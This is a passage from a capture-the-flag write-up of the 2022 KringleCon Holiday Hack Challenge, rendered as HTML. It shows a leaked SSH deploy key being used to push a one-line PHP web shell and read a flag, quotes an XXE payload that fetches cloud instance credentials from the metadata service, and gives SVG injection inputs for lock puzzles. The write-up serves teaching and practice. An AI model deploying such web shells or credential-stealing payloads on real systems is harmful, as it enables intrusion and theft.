+</span></span><span style=display:flex><span>AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
+</span></span><span style=display:flex><span><span style=color:#268bd2>PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ</span><span style=color:#719e07>==</span>
+</span></span><span style=display:flex><span>-----END OPENSSH PRIVATE KEY-----
+</span></span></code></pre></div><p>We can use this SSH key to push to the repo.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#586e75># copy the ssh key</span>
+</span></span><span style=display:flex><span>$ cp wordpress.flag.net.internal/.ssh/.deploy ~/.ssh/
+</span></span><span style=display:flex><span><span style=color:#586e75># change the permissions so ssh-agent doesn&#39;t complain</span>
+</span></span><span style=display:flex><span>$ chmod <span style=color:#2aa198>600</span> ~/.ssh/.deploy
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#586e75># start the ssh-agent in the background</span>
+</span></span><span style=display:flex><span>$ <span style=color:#b58900>eval</span> <span style=color:#2aa198>&#34;</span><span style=color:#719e07>$(</span>ssh-agent -s<span style=color:#719e07>)</span><span style=color:#2aa198>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#586e75># add the private key</span>
+</span></span><span style=display:flex><span>$ ssh-add ~/.ssh/.deploy
+</span></span></code></pre></div><p>Now, we can try modifying the website and pushing stuff.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#586e75># set the git user.email and user.name</span>
+</span></span><span style=display:flex><span>$ git config --global user.email <span style=color:#2aa198>&#34;sporx@kringlecon.com&#34;</span>
+</span></span><span style=display:flex><span>$ git config --global user.name <span style=color:#2aa198>&#34;sporx&#34;</span>
+</span></span></code></pre></div><p>Change the remote URL to SSH</p><pre tabindex=0><code>$ git checkout main
+$ git remote set-url origin git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git
+# alternatively we could just clone the SSH URL and work There
+$ git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git
+</code></pre><p>Do a test</p><pre tabindex=0><code>$ nano nem.txt
+$ git add .
+$ git commit -m &#34;test&#34;
+$ git push origin main
+</code></pre><p>But where's the site?</p><p>In <code>wp-config.php</code> we see:</p><pre tabindex=0><code>if(getenv_docker(&#39;WORDPRESS_ENV&#39;, false)) {
+        $url = &#34;http://wordpress.flag.net.internal:8080&#34;;
+} else {
+        $url = &#34;http://wordpress.flag.net.internal&#34;;
+}
+
+
+define( &#39;WP_HOME&#39;, $url);
+define( &#39;WP_SITEURL&#39;, $url);
+</code></pre><p>I pushed <code>nem.txt</code> and now I can see it with <code>curl http://wordpress.flag.net.internal/nem.txt</code>.</p><p>No need for a remote shell. Normal PHP web shell does the job. I used:
+<a href=https://github.com/bayufedra/Tiny-PHP-Webshell target=_blank rel="noreferrer noopener">https://github.com/bayufedra/Tiny-PHP-Webshell</a></p><pre tabindex=0><code>$ nano shell.php
+# paste the code `&lt;?=`$_GET[0]`?&gt;`
+$ git add .
+$ git commit -m &#34;sholl&#34;
+# might have to use -v here to accept the server fingerprint if this is your first interaction via SSH
+$ git push origin main
+</code></pre><p>The shell works:</p><pre tabindex=0><code>$ curl http://wordpress.flag.net.internal/shell.php?0=ls
+index.php
+license.txt
+readme.html
+shell.php
+wp-activate.php
+# removed
+
+$ curl http://wordpress.flag.net.internal/shell.php?0=ls%20../../../
+bin
+boot
+dev
+etc
+flag.txt
+# removed
+</code></pre><p>What are we supposed to do here again?</p><pre tabindex=0><code>$ curl http://wordpress.flag.net.internal/shell.php?0=cat%20../../../flag.txt
+`oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT`
+</code></pre><h1 id=recover-the-web-ring>Recover the Web Ring
+<a class=header-link href=#recover-the-web-ring><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><h2 id=naughty-ip>Naughty IP
+<a class=header-link href=#naughty-ip><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><ol><li>Wireshark <code>statistics > conversations</code>.</li><li>Sort by <code>Bytes</code>.</li><li>Most talkative is <code>18.222.86.32</code></li></ol><h2 id=credential-mining>Credential Mining
+<a class=header-link href=#credential-mining><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>The first attack is a brute force login. What's the first username tried?</p><p>In Wireshark</p><ol><li><code>Edit > Find Packet</code>.</li><li>Change the combo box with <code>Display Filter</code> to <code>String</code>.</li><li>Search for <code>POST /login.html</code>.</li></ol><p>First result is <code>alice</code>:</p><pre tabindex=0><code>username=alice&amp;password=philip
+</code></pre><h2 id=404-ftw>404 FTW
+<a class=header-link href=#404-ftw><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>The next attack is forced browsing where the naughty one is guessing URLs.
+What's the first successful URL path in this attack?</p><p>Answer: <code>/proc</code>.</p><p>Look at the logs. We can do this in VS Code with regex search then
+<code>ctrl+shift+l</code> to select all the results and copy them somewhere else for
+further analysis.</p><ol><li>Only look at requests from <code>18.222.86.32</code>. <code>^18.222.86.32.*</code> (the dots will
+replace any character here but we're dealing with IP addresses here so it
+doesn't matter and we don't have to escape them with <code>\.</code>).</li><li>We know forced browsing is with <code>GET</code> so we search with this regex in the
+logs <code>GET .* 200 -</code> and we find a few in the beginning which we don't care
+about.</li><li>The first one in the middle is
+<code>18.222.86.32 - - [05/Oct/2022 16:47:46] "GET /proc HTTP/1.1" 200 -</code></li></ol><h2 id=imds-xxe-and-other-abbreviations>IMDS, XXE, and Other Abbreviations
+<a class=header-link href=#imds-xxe-and-other-abbreviations><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>The last step in this attack was to use XXE to get secret keys from the IMDS
+service. What URL did the attacker force the server to fetch?</p><p>In the logs search for <code>accesskey</code> to see the URL. The URL is on two lines so
+don't just copy/paste the first part.</p><pre tabindex=0><code>18.191.6.79 - - [05/Oct/2022 16:48:57] &#34;GET / HTTP/1.1&#34; 200 -
+ic| xml: (b&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+         &lt;!DOCTYPE foo [ &lt;!ENTITY id SYSTE&#39;
+          b&#39;M &#34;http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security&#39;
+          b&#39;-credentials/ec2-instance&#34;&gt; ]&gt;
+// removed
+</code></pre><p>Answer:
+<code>http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance</code></p><h2 id=open-boria-mine-door>Open Boria Mine Door
+<a class=header-link href=#open-boria-mine-door><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>Open the door to the Boria Mines. Help Alabaster Snowball in the Web Ring to get
+some hints for this challenge.</p><p>Hint from the badge:</p><pre tabindex=0><code>Lock Mechanism
+From: Alabaster Snowball
+Terminal: Boria Mine Door
+
+The locks take input, render some type of image, and process on the back end to
+unlock. To start, take a good look at the source HTML/JavaScript.
+</code></pre><p>Open DevTools to see the request/responses. Enter any input in the first one.</p><h3 id=pin1>Pin1
+<a class=header-link href=#pin1><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>POST request to <code>https://hhc22-novel.kringlecon.com/pin1</code>. Response has a
+comment. <code>@&@&&W&&W&&&&</code>. That unlocks pin1.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#719e07>&lt;!DOCTYPE html&gt;</span>
+</span></span><span style=display:flex><span>&lt;<span style=color:#268bd2>html</span> lang<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;en&#34;</span>&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#268bd2>head</span>&gt;
+</span></span><span style=display:flex><span>   <span style=color:#586e75>&lt;!-- removed --&gt;</span>
+</span></span><span style=display:flex><span>&lt;/<span style=color:#268bd2>head</span>&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#268bd2>body</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>form</span> method<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;post&#39;</span> action<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;pin1&#39;</span>&gt;
+</span></span><span style=display:flex><span>        <span style=color:#586e75>&lt;!-- @&amp;@&amp;&amp;W&amp;&amp;W&amp;&amp;&amp;&amp; --&gt;</span>
+</span></span><span style=display:flex><span>        &lt;<span style=color:#268bd2>input</span> class<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;inputTxt&#39;</span> name<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;inputTxt&#39;</span> type<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;text&#39;</span> value<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;&#39;</span> autocomplete<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;off&#39;</span> /&gt;
+</span></span><span style=display:flex><span>        &lt;<span style=color:#268bd2>button</span>&gt;GO&lt;/<span style=color:#268bd2>button</span>&gt;
+</span></span><span style=display:flex><span>    &lt;/<span style=color:#268bd2>form</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>div</span> class<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;output&#39;</span>&gt;&lt;/<span style=color:#268bd2>div</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>img</span> class<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;captured&#39;</span>/&gt;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>script</span> src<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;js/3d4f2bf07dc1be38b20cd6e46949a1071f9d0e3d.js&#39;</span>&gt;&lt;/<span style=color:#268bd2>script</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>script</span> src<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;pin.js&#39;</span>&gt;&lt;/<span style=color:#268bd2>script</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#268bd2>body</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#268bd2>html</span>&gt;
+</span></span></code></pre></div><p>Anything to connect these two. I think these are rendered somewhat. Either it's
+inside HTML or if it's rendered in an svg?!</p><p><code>&&&&&&&&&&&&&</code> also works.</p><h3 id=pin2>Pin2
+<a class=header-link href=#pin2><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p><a href=https://hhc22-novel.kringlecon.com/pin2 target=_blank rel="noreferrer noopener">https://hhc22-novel.kringlecon.com/pin2</a> response is:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#719e07>&lt;!DOCTYPE html&gt;</span>
+</span></span><span style=display:flex><span>&lt;<span style=color:#268bd2>html</span> lang<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;en&#34;</span>&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#268bd2>head</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>meta</span> charset<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;UTF-8&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>meta</span> http-equiv<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;X-UA-Compatible&#34;</span> content<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;IE=edge&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>meta</span> name<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;viewport&#34;</span> content<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>meta</span> http-equiv<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;Content-Security-Policy&#34;</span> content<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;default-src &#39;self&#39;;script-src &#39;self&#39;;style-src &#39;self&#39; &#39;unsafe-inline&#39;&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>title</span>&gt;Lock 2&lt;/<span style=color:#268bd2>title</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>link</span> rel<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;stylesheet&#34;</span> href<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;pin.css&#34;</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#268bd2>head</span>&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#268bd2>body</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>form</span> method<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;post&#39;</span> action<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;pin2&#39;</span>&gt;
+</span></span><span style=display:flex><span>        <span style=color:#586e75>&lt;!-- TODO: FILTER OUT HTML FROM USER INPUT --&gt;</span>
+</span></span><span style=display:flex><span>        &lt;<span style=color:#268bd2>input</span> class<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;inputTxt&#39;</span> name<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;inputTxt&#39;</span> type<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;text&#39;</span> value<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;&#39;</span> autocomplete<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;off&#39;</span> /&gt;
+</span></span><span style=display:flex><span>        &lt;<span style=color:#268bd2>button</span>&gt;GO&lt;/<span style=color:#268bd2>button</span>&gt;
+</span></span><span style=display:flex><span>    &lt;/<span style=color:#268bd2>form</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>div</span> class<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;output&#39;</span>&gt;&lt;/<span style=color:#268bd2>div</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>img</span> class<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;captured&#39;</span>/&gt;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>script</span> src<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;js/ba8074100d1fe69c3f7e7bfee1f3468815472cf0.js&#39;</span>&gt;&lt;/<span style=color:#268bd2>script</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>script</span> src<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;pin.js&#39;</span>&gt;&lt;/<span style=color:#268bd2>script</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#268bd2>body</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#268bd2>html</span>&gt;
+</span></span></code></pre></div><p><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/style-src target=_blank rel="noreferrer noopener">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/style-src</a></p><p>Content-Security-Policy: style-src 'unsafe-inline';</p><p>This works because we need to connect <code>0,74</code> to <code>200,153</code>.
+The image is <code>200 width by 170 height</code>.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;svg</span> xmlns=<span style=color:#2aa198>&#34;http://www.w3.org/2000/svg&#34;</span> style=<span style=color:#2aa198>&#34;border:1px solid #ddd;&#34;</span> width=<span style=color:#2aa198>&#34;200&#34;</span> height=<span style=color:#2aa198>&#34;170&#34;</span> <span style=color:#268bd2>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;path</span> d=<span style=color:#2aa198>&#34;M0 74L200 153&#34;</span> stroke=<span style=color:#2aa198>&#34;white&#34;</span> stroke-width=<span style=color:#2aa198>&#34;10&#34;</span><span style=color:#268bd2>&gt;&lt;/path&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#268bd2>&lt;/svg&gt;</span>
+</span></span></code></pre></div><h3 id=pin3>Pin3
+<a class=header-link href=#pin3><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#719e07>&lt;!DOCTYPE html&gt;</span>
+</span></span><span style=display:flex><span>&lt;<span style=color:#268bd2>html</span> lang<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;en&#34;</span>&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#268bd2>head</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>meta</span> charset<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;UTF-8&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>meta</span> http-equiv<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;X-UA-Compatible&#34;</span> content<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;IE=edge&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>meta</span> name<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;viewport&#34;</span> content<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>meta</span> http-equiv<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;Content-Security-Policy&#34;</span> content<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;script-src &#39;self&#39; &#39;unsafe-inline&#39;; style-src &#39;self&#39;&#34;</span>&gt;
+</span></span><span style=display:flex><span>    <span style=color:#586e75>&lt;!-- &lt;meta http-equiv=&#34;Content-Security-Policy&#34; content=&#34;default-src &#39;self&#39;; img-src https://*; child-src &#39;none&#39;;&#34;&gt; --&gt;</span>
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>title</span>&gt;Lock 3&lt;/<span style=color:#268bd2>title</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>link</span> rel<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;stylesheet&#34;</span> href<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;pin.css&#34;</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#268bd2>head</span>&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#268bd2>body</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>form</span> method<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;post&#39;</span> action<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;pin3&#39;</span>&gt;
+</span></span><span style=display:flex><span>        <span style=color:#586e75>&lt;!-- TODO: FILTER OUT JAVASCRIPT FROM USER INPUT --&gt;</span>
+</span></span><span style=display:flex><span>        &lt;<span style=color:#268bd2>input</span> class<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;inputTxt&#39;</span> name<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;inputTxt&#39;</span> type<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;text&#39;</span> value<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;&#39;</span> autocomplete<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;off&#39;</span> /&gt;
+</span></span><span style=display:flex><span>        &lt;<span style=color:#268bd2>button</span>&gt;GO&lt;/<span style=color:#268bd2>button</span>&gt;
+</span></span><span style=display:flex><span>    &lt;/<span style=color:#268bd2>form</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>div</span> class<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;output&#39;</span>&gt;&lt;/<span style=color:#268bd2>div</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>img</span> class<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;captured&#39;</span>/&gt;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#586e75>&lt;!-- js --&gt;</span>
+</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>script</span> src<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;pin.js&#39;</span>&gt;&lt;/<span style=color:#268bd2>script</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#268bd2>body</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#268bd2>html</span>&gt;
+</span></span></code></pre></div><p>Color is blue: RGB(0,0,255). 0,95 -> 200,21.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;svg</span> xmlns=<span style=color:#2aa198>&#34;http://www.w3.org/2000/svg&#34;</span> style=<span style=color:#2aa198>&#34;border:1px solid #ddd;&#34;</span> width=<span style=color:#2aa198>&#34;200&#34;</span> height=<span style=color:#2aa198>&#34;170&#34;</span> <span style=color:#268bd2>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;path</span> d=<span style=color:#2aa198>&#34;M0 95L200 21&#34;</span> stroke=<span style=color:#2aa198>&#34;blue&#34;</span> stroke-width=<span style=color:#2aa198>&#34;10&#34;</span><span style=color:#268bd2>&gt;&lt;/path&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#268bd2>&lt;/svg&gt;</span>
+</span></span></code></pre></div><h3 id=pin4>Pin4
+<a class=header-link href=#pin4><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>Has some filtering:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#719e07>&lt;!DOCTYPE html&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#268bd2>&lt;html</span> lang=<span style=color:#2aa198>&#34;en&#34;</span><span style=color:#268bd2>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#268bd2>&lt;head&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;meta</span> charset=<span style=color:#2aa198>&#34;UTF-8&#34;</span><span style=color:#268bd2>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;meta</span> http-equiv=<span style=color:#2aa198>&#34;X-UA-Compatible&#34;</span> content=<span style=color:#2aa198>&#34;IE=edge&#34;</span><span style=color:#268bd2>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;meta</span> name=<span style=color:#2aa198>&#34;viewport&#34;</span> content=<span style=color:#2aa198>&#34;width=device-width, initial-scale=1.0&#34;</span><span style=color:#268bd2>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;title&gt;</span>Lock 4<span style=color:#268bd2>&lt;/title&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;link</span> rel=<span style=color:#2aa198>&#34;stylesheet&#34;</span> href=<span style=color:#2aa198>&#34;pin.css&#34;</span><span style=color:#268bd2>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;script&gt;</span>
+</span></span><span style=display:flex><span>        const sanitizeInput = () =&gt; {
+</span></span><span style=display:flex><span>            const input = document.querySelector(&#39;.inputTxt&#39;);
+</span></span><span style=display:flex><span>            const content = input.value;
+</span></span><span style=display:flex><span>            input.value = content
+</span></span><span style=display:flex><span>                .replace(/&#34;/, &#39;&#39;)
+</span></span><span style=display:flex><span>                .replace(/&#39;/, &#39;&#39;)
+</span></span><span style=display:flex><span>                .replace(/&lt;/, &#39;&#39;)
+</span></span><span style=display:flex><span>                .replace(/&gt;/, &#39;&#39;);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;/script&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#268bd2>&lt;/head&gt;</span>
